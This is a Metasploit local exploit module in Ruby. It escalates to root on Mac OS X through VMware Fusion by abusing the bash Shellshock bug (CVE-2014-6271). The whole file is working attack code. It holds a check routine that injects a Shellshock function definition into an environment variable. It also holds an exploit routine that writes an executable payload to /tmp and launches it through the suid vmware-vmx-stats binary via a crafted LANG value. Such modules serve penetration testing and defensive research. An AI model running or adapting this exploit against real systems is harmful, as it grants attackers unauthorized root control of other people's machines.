# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;rex&#039;

class Metasploit3 < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;          => &#039;Mac OS X VMWare Fusion Root Privilege Escalation Exploit&#039;,
      &#039;Description&#039;   => %q{
        This abuses the bug in bash environment variables (CVE-2014-6271) to get
        a suid binary inside of VMWare Fusion to launch our payload as root.
      },
      &#039;License&#039;       => MSF_LICENSE,
      &#039;Author&#039;        =>
        [
          &#039;Stephane Chazelas&#039;, # discovered the bash bug
          &#039;juken&#039;, # discovered the VMWare priv esc
          &#039;joev&#039;, # msf module
          &#039;mubix&#039; # vmware-vmx-stats
        ],
      &#039;References&#039;    =>
        [
          [ &#039;CVE&#039;, &#039;2014-6271&#039; ]
        ],
      &#039;Platform&#039;      => &#039;osx&#039;,
      &#039;Arch&#039;          => [ ARCH_X86_64 ],
      &#039;Targets&#039;       => [
        [ &#039;Mac OS X 10.9 Mavericks x64 (Native Payload)&#039;,
          {
            &#039;Platform&#039; => &#039;osx&#039;,
            &#039;Arch&#039; => ARCH_X86_64
          }
        ]
      ],
      &#039;DefaultTarget&#039; => 0,
      &#039;DisclosureDate&#039; => &#039;Sep 24 2014&#039;
    ))

    register_options([
      OptString.new(&#039;VMWARE_PATH&#039;, [true, "The path to VMware.app", &#039;/Applications/VMware Fusion.app&#039;]),
    ], self.class)
  end

  def check
    check_str = Rex::Text.rand_text_alphanumeric(5)
    # ensure they are vulnerable to bash env variable bug
    if cmd_exec("env x=&#039;() { :;}; echo #{check_str}&#039; bash -c echo").include?(check_str) &&
       cmd_exec("file &#039;#{datastore[&#039;VMWARE_PATH&#039;]}&#039;") !~ /cannot open/

      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    payload_file = "/tmp/#{Rex::Text::rand_text_alpha_lower(12)}"
    path = &#039;/Contents/Library/vmware-vmx-stats&#039; # path to the suid binary

    print_status("Writing payload file as &#039;#{payload_file}&#039;")
    exe = Msf::Util::EXE.to_osx_x64_macho(framework, payload.encoded)
    write_file(payload_file, exe)
    register_file_for_cleanup(payload_file)
    cmd_exec("chmod +x #{payload_file}")

    print_status("Running VMWare services...")
    cmd_exec("LANG=&#039;() { :;}; #{payload_file}&#039; &#039;#{datastore[&#039;VMWARE_PATH&#039;]}#{path}&#039; /dev/random")
  end

end

